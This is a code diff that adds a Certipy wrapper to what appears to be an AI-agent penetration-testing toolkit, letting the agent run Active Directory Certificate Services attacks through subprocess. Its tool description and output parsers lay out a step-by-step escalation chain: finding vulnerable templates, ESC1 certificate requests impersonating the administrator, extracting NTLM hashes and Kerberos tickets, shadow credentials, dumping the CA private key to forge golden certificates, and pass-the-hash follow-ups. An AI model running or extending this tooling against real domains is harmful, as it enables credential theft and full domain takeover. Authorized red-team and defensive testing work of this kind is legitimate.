@@ -1530,6 +1530,417 @@ class LdapsearchTool(BaseTool):
         return "\n".join(formatted)
 
 
+class CertipyInput(BaseModel):
+    """Input for Certipy Active Directory certificate attacks"""
+
+    action: str = Field(
+        description="Certipy action: 'find', 'req', 'auth', 'shadow', 'account', 'ca', 'cert', 'forge', 'relay', 'template'"
+    )
+    target: Optional[str] = Field(
+        default=None,
+        description="Target DC IP or hostname (format: domain/username:password@target)"
+    )
+    username: Optional[str] = Field(
+        default=None,
+        description="Username for authentication"
+    )
+    password: Optional[str] = Field(
+        default=None,
+        description="Password for authentication"
+    )
+    domain: Optional[str] = Field(
+        default=None,
+        description="Domain name (e.g., 'corp.local')"
+    )
+    dc_ip: Optional[str] = Field(
+        default=None,
+        description="Domain Controller IP address"
+    )
+    hashes: Optional[str] = Field(
+        default=None,
+        description="NTLM hashes for pass-the-hash (format: 'LM:NT' or ':NT')"
+    )
+    ca: Optional[str] = Field(
+        default=None,
+        description="Certificate Authority name (for req, template actions)"
+    )
+    template: Optional[str] = Field(
+        default=None,
+        description="Certificate template name (for req action)"
+    )
+    upn: Optional[str] = Field(
+        default=None,
+        description="User Principal Name to request certificate for"
+    )
+    dns: Optional[str] = Field(
+        default=None,
+        description="DNS name for certificate (for computer account attacks)"
+    )
+    pfx: Optional[str] = Field(
+        default=None,
+        description="PFX certificate file for authentication"
+    )
+    pfx_password: Optional[str] = Field(
+        default=None,
+        description="PFX certificate password"
+    )
+    output: Optional[str] = Field(
+        default=None,
+        description="Output file for results (JSON, TXT, ZIP)"
+    )
+    extra_args: Optional[str] = Field(
+        default=None,
+        description="Additional certipy arguments (e.g., '-vulnerable', '-old-bloodhound', '-enabled')"
+    )
+
+
+class CertipyTool(BaseTool):
+    """Tool for Active Directory certificate abuse using Certipy"""
+
+    name: str = "certipy"
+    description: str = """
+    Abuse Active Directory Certificate Services (AD CS) using Certipy for various certificate-based attacks.
+    
+    MAIN ACTIONS:
+    
+    1. ENUMERATION & RECONNAISSANCE:
+       - find: Enumerate certificate templates, CAs, and identify vulnerabilities
+         Example: action="find", domain="corp.local", username="user", password="pass", dc_ip="192.168.1.10"
+         Extra: extra_args="-vulnerable" (only show vulnerable templates)
+                extra_args="-old-bloodhound" (output for BloodHound)
+                extra_args="-enabled" (only enabled templates)
+    
+    2. CERTIFICATE REQUEST (ESC1, ESC2, ESC3):
+       - req: Request a certificate from a template
+         Example: action="req", domain="corp.local", username="user", password="pass", 
+                  ca="corp-DC-CA", template="User", dc_ip="192.168.1.10"
+         For ESC1 (UPN spoofing): upn="administrator@corp.local"
+         For computer accounts: dns="dc.corp.local"
+    
+    3. AUTHENTICATION WITH CERTIFICATE:
+       - auth: Authenticate using a PFX certificate to get NTLM hash/TGT
+         Example: action="auth", pfx="administrator.pfx", dc_ip="192.168.1.10", domain="corp.local"
+    
+    4. SHADOW CREDENTIALS (ESC4):
+       - shadow: Add shadow credentials to target account (requires write privileges)
+         Example: action="shadow", domain="corp.local", username="user", password="pass",
+                  target="DC$", dc_ip="192.168.1.10", extra_args="add"
+         Then: action="shadow", extra_args="auto" (automatically auth with shadow creds)
+    
+    5. GOLDEN CERTIFICATE (ESC5):
+       - ca: Dump CA certificate and private key (requires admin on CA)
+         Example: action="ca", domain="corp.local", username="Administrator", password="pass",
+                  ca="corp-DC-CA", dc_ip="192.168.1.10"
+       - forge: Forge golden certificate (after dumping CA key)
+         Example: action="forge", ca_pfx="corp-DC-CA.pfx", upn="Administrator@corp.local",
+                  extra_args="-subject 'CN=Administrator,CN=Users,DC=corp,DC=local'"
+    
+    6. ACCOUNT CREATION (ESC6):
+       - account: Create/modify accounts via certificates
+         Example: action="account", domain="corp.local", pfx="user.pfx"
+    
+    7. TEMPLATE MANAGEMENT:
+       - template: Manage certificate templates (requires CA admin)
+         Example: action="template", domain="corp.local", username="admin", password="pass",
+                  ca="corp-DC-CA", extra_args="list"
+    
+    COMMON AD CS ESCALATION PATHS (ESC):
+    - ESC1: Template allows SAN (Subject Alternative Name) - request cert for any user
+    - ESC2: Template allows any purpose - can be used for authentication
+    - ESC3: Enrollment agent templates - request certificates on behalf of others
+    - ESC4: Write access to template/account - modify template or add shadow credentials
+    - ESC5: Vulnerable CA configuration - extract CA key, forge golden certificates
+    - ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 flag - SAN specification in any template
+    - ESC7: Vulnerable CA access control - modify CA to enable attacks
+    - ESC8: NTLM relay to AD CS HTTP endpoints
+    
+    AUTHENTICATION METHODS:
+    - Password: username + password + domain + dc_ip
+    - Pass-the-Hash: username + hashes + domain + dc_ip
+    - Certificate: pfx + pfx_password (for auth action)
+    
+    TYPICAL ATTACK WORKFLOW:
+    1. Find vulnerable templates: action="find", extra_args="-vulnerable"
+    2. Request certificate with ESC1: action="req", ca="...", template="...", upn="administrator@domain"
+    3. Authenticate with certificate: action="auth", pfx="administrator.pfx"
+    4. Use obtained NTLM hash or TGT for further attacks
+    
+    OUTPUT:
+    - JSON files contain detailed enumeration data
+    - PFX files are certificates for authentication
+    - ZIP files contain CA backups
+    - Use output parameter to specify custom output filename
+    """
+    args_schema: type[BaseModel] = CertipyInput
+
+    def _run(
+        self,
+        action: str,
+        target: Optional[str] = None,
+        username: Optional[str] = None,
+        password: Optional[str] = None,
+        domain: Optional[str] = None,
+        dc_ip: Optional[str] = None,
+        hashes: Optional[str] = None,
+        ca: Optional[str] = None,
+        template: Optional[str] = None,
+        upn: Optional[str] = None,
+        dns: Optional[str] = None,
+        pfx: Optional[str] = None,
+        pfx_password: Optional[str] = None,
+        output: Optional[str] = None,
+        extra_args: Optional[str] = None,
+    ) -> str:
+        """Execute Certipy action"""
+
+        # Valid actions
+        valid_actions = [
+            "find", "req", "auth", "shadow", "account", 
+            "ca", "cert", "forge", "relay", "template"
+        ]
+        
+        if action not in valid_actions:
+            return f"Invalid action '{action}'. Valid options: {', '.join(valid_actions)}"
+
+        # Build certipy command
+        cmd = ["certipy", action]
+
+        # Build target string for most actions (format: domain/username:password@dc_ip)
+        if action not in ["auth", "forge", "cert"] and (username or target):
+            if target:
+                # Use provided target string directly
+                cmd.append(target)
+            else:
+                # Build target string from components
+                target_str = ""
+                if domain:
+                    target_str += f"{domain}/"
+                if username:
+                    target_str += username
+                if password and not hashes:
+                    target_str += f":{password}"
+                if dc_ip:
+                    target_str += f"@{dc_ip}"
+                
+                if target_str:
+                    cmd.append(target_str)
+
+        # Add authentication for specific actions
+        if hashes and action not in ["auth", "forge"]:
+            cmd.extend(["-hashes", hashes])
+
+        # Add DC IP if not in target string
+        if dc_ip and not target and action in ["find", "shadow", "account", "ca", "template"]:
+            cmd.extend(["-dc-ip", dc_ip])
+
+        # Action-specific parameters
+        if ca:
+            cmd.extend(["-ca", ca])
+        
+        if template:
+            cmd.extend(["-template", template])
+        
+        if upn:
+            cmd.extend(["-upn", upn])
+        
+        if dns:
+            cmd.extend(["-dns", dns])
+
+        # Certificate-based authentication
+        if pfx:
+            cmd.extend(["-pfx", pfx])
+            if pfx_password:
+                cmd.extend(["-pfx-password", pfx_password])
+
+        # Output file
+        if output:
+            cmd.extend(["-output", output])
+        elif action in ["find", "req", "shadow", "ca"]:
+            # Auto-generate output filename for actions that produce files
+            cmd.extend(["-output", f"certipy_{action}"])
+
+        # Extra arguments
+        if extra_args:
+            try:
+                extra_list = shlex.split(extra_args)
+                cmd.extend(extra_list)
+            except ValueError:
+                cmd.extend(extra_args.split())
+
+        # Format command for display (mask password)
+        cmd_display = " ".join(cmd)
+        if password:
+            cmd_display = cmd_display.replace(f":{password}@", ":***@")
+
+        # Ask for confirmation if configured
+        if self.config and self.config.confirm_commands:
+            if not confirm_execution(cmd_display, "certipy"):
+                return "Command skipped by user"
+
+        try:
+            result = subprocess.run(
+                cmd,
+                capture_output=True,
+                text=True,
+                timeout=300,  # 5 minute timeout
+            )
+
+            output_text = result.stdout + result.stderr
+
+            if not output_text.strip():
+                return f"Command: {cmd_display}\n\nNo output - check credentials and target"
+
+            return self._format_output(output_text, cmd_display, action)
+
+        except subprocess.TimeoutExpired:
+            return f"Command: {cmd_display}\n\nTimeout after 5 minutes"
+        except FileNotFoundError:
+            return "Certipy not installed. Install with:\n  pipx install certipy-ad\n  # or\n  pip install certipy-ad"
+        except Exception as e:
+            return f"Error running certipy: {str(e)}"
+
+    def _format_output(self, output: str, cmd_display: str, action: str) -> str:
+        """Format Certipy output with command and structured sections"""
+
+        formatted = []
+        formatted.append(f"Command: {cmd_display}")
+        formatted.append("")
+        formatted.append(f"CERTIPY [{action.upper()}] RESULTS:")
+        formatted.append("─" * 80)
+
+        # Action-specific parsing
+        if action == "find":
+            return self._parse_find(output, cmd_display)
+        elif action == "req":
+            return self._parse_req(output, cmd_display)
+        elif action == "auth":
+            return self._parse_auth(output, cmd_display)
+        elif action == "shadow":
+            return self._parse_shadow(output, cmd_display)
+        else:
+            # Generic output formatting
+            formatted.append("")
+            formatted.append(output)
+            formatted.append("")
+            formatted.append("─" * 80)
+            return "\n".join(formatted)
+
+    def _parse_find(self, output: str, cmd_display: str) -> str:
+        """Parse certipy find output"""
+        formatted = [f"Command: {cmd_display}", "", "CERTIFICATE ENUMERATION RESULTS:", "─" * 80]
+
+        cas = []
+        templates = []
+        vulnerable = []
+        
+        for line in output.split("\n"):
+            line_stripped = line.strip()
+            
+            if "Certificate Authorities" in line or "CA Name" in line:
+                cas.append(line_stripped)
+            elif "Certificate Templates" in line or "Template Name" in line:
+                templates.append(line_stripped)
+            elif any(x in line for x in ["ESC1", "ESC2", "ESC3", "ESC4", "ESC5", "ESC6", "ESC7", "ESC8"]):
+                vulnerable.append(line_stripped)
+
+        if cas:
+            formatted.extend(["", "CERTIFICATE AUTHORITIES:"])
+            formatted.extend(f"  {ca}" for ca in cas[:20])
+
+        if templates:
+            formatted.extend(["", f"CERTIFICATE TEMPLATES ({len(templates)}):"])
+            formatted.extend(f"  {t}" for t in templates[:30])
+
+        if vulnerable:
+            formatted.extend(["", f"VULNERABLE TEMPLATES ({len(vulnerable)}):"])
+            formatted.extend(f"  ⚠️  {v}" for v in vulnerable)
+            formatted.extend(["", "NEXT STEPS:",
+                           "  • Identify the ESC (Escalation Scenario) number",
+                           "  • Use 'req' action to request certificate from vulnerable template",
+                           "  • Use 'auth' action to authenticate with obtained certificate"])
+        
+        # Always show key parts of raw output
+        formatted.extend(["", "FULL OUTPUT:", output[:3000]])
+        if len(output) > 3000:
+            formatted.append("... (truncated)")
+
+        formatted.append("─" * 80)
+        return "\n".join(formatted)
+
+    def _parse_req(self, output: str, cmd_display: str) -> str:
+        """Parse certipy req output"""
+        formatted = [f"Command: {cmd_display}", "", "CERTIFICATE REQUEST RESULTS:", "─" * 80]
+
+        pfx_files = []
+        errors = []
+        
+        for line in output.split("\n"):
+            if ".pfx" in line.lower() and "saved" in line.lower():
+                pfx_files.append(line.strip())
+            elif "error" in line.lower() or "failed" in line.lower() or "denied" in line.lower():
+                errors.append(line.strip())
+
+        if pfx_files:
+            formatted.extend(["", "SUCCESS - CERTIFICATE OBTAINED:"])
+            formatted.extend(f"  ✓ {f}" for f in pfx_files)
+            formatted.extend(["", "NEXT STEPS:",
+                           "  • Use 'auth' action with the PFX file to get NTLM hash/TGT",
+                           "  • Example: certipy auth -pfx <file>.pfx -dc-ip <DC_IP>"])
+        
+        if errors:
+            formatted.extend(["", "ERRORS:"])
+            formatted.extend(f"  ✗ {e}" for e in errors)
+
+        formatted.extend(["", "FULL OUTPUT:", output])
+        formatted.append("─" * 80)
+        return "\n".join(formatted)
+
+    def _parse_auth(self, output: str, cmd_display: str) -> str:
+        """Parse certipy auth output"""
+        formatted = [f"Command: {cmd_display}", "", "CERTIFICATE AUTHENTICATION RESULTS:", "─" * 80]
+
+        hashes = []
+        tgt = []
+        
+        for line in output.split("\n"):
+            if "NTLM" in line or ":::" in line:
+                hashes.append(line.strip())
+            elif ".ccache" in line or "TGT" in line:
+                tgt.append(line.strip())
+
+        if hashes:
+            formatted.extend(["", "NTLM HASHES OBTAINED:"])
+            formatted.extend(f"  ✓ {h}" for h in hashes)
+            formatted.extend(["", "NEXT STEPS:",
+                           "  • Use hash for pass-the-hash attacks",
+                           "  • Example: impacket script='psexec' hashes='<hash>' target='<target>'"])
+        
+        if tgt:
+            formatted.extend(["", "KERBEROS TGT OBTAINED:"])
+            formatted.extend(f"  ✓ {t}" for t in tgt)
+            formatted.extend(["", "NEXT STEPS:",
+                           "  • Export KRB5CCNAME=<file>.ccache",
+                           "  • Use TGT for Kerberos attacks"])
+
+        formatted.extend(["", "FULL OUTPUT:", output])
+        formatted.append("─" * 80)
+        return "\n".join(formatted)
+
+    def _parse_shadow(self, output: str, cmd_display: str) -> str:
+        """Parse certipy shadow credentials output"""
+        formatted = [f"Command: {cmd_display}", "", "SHADOW CREDENTIALS RESULTS:", "─" * 80]
+
+        formatted.extend(["", "FULL OUTPUT:", output])
+        
+        if "added" in output.lower():
+            formatted.extend(["", "NEXT STEPS:",
+                           "  • Use 'shadow' with 'auto' to authenticate",
+                           "  • Or use 'auth' action with generated PFX"])
+
+        formatted.append("─" * 80)
+        return "\n".join(formatted)
+
+
 class BashExecutionInput(BaseModel):
     """Input for bash command execution"""
 
@@ -1603,6 +2014,7 @@ _TOOL_CLASSES = {
     "impacket": ImpacketTool,
     "ldapsearch": LdapsearchTool,
     "hashcat": HashcatTool,
+    "certipy": CertipyTool,
     "bash": BashExecutionTool,
 }
 
